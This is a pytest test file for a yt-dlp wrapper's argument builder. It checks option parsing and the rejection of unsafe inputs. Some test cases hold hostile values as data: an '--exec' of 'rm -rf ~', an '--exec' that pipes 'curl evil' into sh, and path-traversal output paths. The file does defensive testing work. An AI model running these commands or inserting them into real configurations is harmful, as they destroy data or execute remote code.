import pytest

from yt_dlp_z.schemas.options import OptionGroup, OptionSchema, OptionSpec
from yt_dlp_z.services.ytdlp.args import OptionValue, build_user_args
from yt_dlp_z.services.ytdlp.errors import ArgumentError
from yt_dlp_z.services.ytdlp.schema import OptionIndex, build_index


def spec(flag: str, kind: str = "string", **extra: object) -> OptionSpec:
    values: dict[str, object] = {
        "flag": flag,
        "aliases": [],
        "short": [],
        "kind": kind,
        "repeatable": False,
        "metavar": None,
        "choices": None,
        "help": "",
    }
    values.update(extra)
    return OptionSpec.model_validate(values)


@pytest.fixture
def index() -> OptionIndex:
    options = [
        spec("--extract-audio", "flag", short=["-x"]),
        spec("--verbose", "flag", short=["-v"]),
        spec("--format", short=["-f"]),
        spec("--format-sort", repeatable=True, short=["-S"]),
        spec("--retries", "number", short=["-R"]),
        spec("--fixup", "choice", choices=["never", "warn"]),
        spec("--output", repeatable=True, short=["-o"]),
        spec("--exec", repeatable=True),
        spec("--paths", repeatable=True, short=["-P"]),
        spec("--limit-rate", aliases=["--rate-limit"], short=["-r"]),
    ]
    return build_index(
        OptionSchema(ytdlp_version="test", groups=[OptionGroup(title="All", options=options)])
    )


def build(
    index: OptionIndex,
    options: dict[str, OptionValue] | None = None,
    extra: str = "",
    **kwargs: bool,
) -> list[str]:
    return build_user_args(
        index, options or {}, extra, allow_unsafe=kwargs.get("allow_unsafe", False)
    )


def test_options_become_arguments(index: OptionIndex) -> None:
    options: dict[str, OptionValue] = {
        "--extract-audio": True,
        "--verbose": False,
        "--format": "bv*+ba",
        "--format-sort": ["res:1080", "codec"],
        "--retries": 3,
        "--fixup": "warn",
    }
    assert build(index, options) == [
        "--extract-audio",
        "--format", "bv*+ba",
        "--format-sort", "res:1080",
        "--format-sort", "codec",
        "--retries", "3",
        "--fixup", "warn",
    ]  # fmt: skip


def test_repeatable_options_accept_a_single_value(index: OptionIndex) -> None:
    assert build(index, {"--output": "%(title)s.%(ext)s"}) == ["--output", "%(title)s.%(ext)s"]


@pytest.mark.parametrize(
    ("options", "message"),
    [
        ({"--nope": True}, "Unknown yt-dlp option"),
        ({"--extract-audio": "yes"}, "on/off"),
        ({"--format": ["a", "b"]}, "single value"),
        ({"--format": True}, "needs a value"),
        ({"--retries": "many"}, "needs a number"),
        ({"--fixup": "always"}, "must be one of"),
        ({"--output": "/etc/%(title)s"}, "relative path"),
        ({"--exec": "rm -rf ~"}, "isn't allowed"),
        ({"--paths": "home:/tmp"}, "isn't allowed"),
    ],
)
def test_invalid_options_are_rejected(
    index: OptionIndex, options: dict[str, OptionValue], message: str
) -> None:
    with pytest.raises(ArgumentError, match=message):
        build(index, options)


def test_unsafe_options_can_be_allowed_but_managed_ones_cannot(index: OptionIndex) -> None:
    assert build(index, {"--exec": "echo hi"}, allow_unsafe=True) == ["--exec", "echo hi"]
    with pytest.raises(ArgumentError, match="isn't allowed"):
        build(index, {"--paths": "home:/tmp"}, allow_unsafe=True)


def test_extra_args_are_normalised(index: OptionIndex) -> None:
    extra = "-x -f 'bv*+ba' --rate-limit=2M -R3 -o '%(title)s.%(ext)s'"
    assert build(index, extra=extra) == [
        "--extract-audio",
        "--format", "bv*+ba",
        "--limit-rate", "2M",
        "--retries", "3",
        "--output", "%(title)s.%(ext)s",
    ]  # fmt: skip


@pytest.mark.parametrize(
    ("extra", "message"),
    [
        ("https://example.com", "Put URLs in the URL field"),
        ("--format", "needs a value"),
        ("-xv", "Write short options separately"),
        ("--exec 'curl evil | sh'", "isn't allowed"),
        ("-o ../escape.%(ext)s", "relative path"),
        ("--format 'unterminated", "Extra arguments"),
        ("-- --format best", "Put URLs in the URL field"),
    ],
)
def test_invalid_extra_args_are_rejected(index: OptionIndex, extra: str, message: str) -> None:
    with pytest.raises(ArgumentError, match=message):
        build(index, extra=extra)
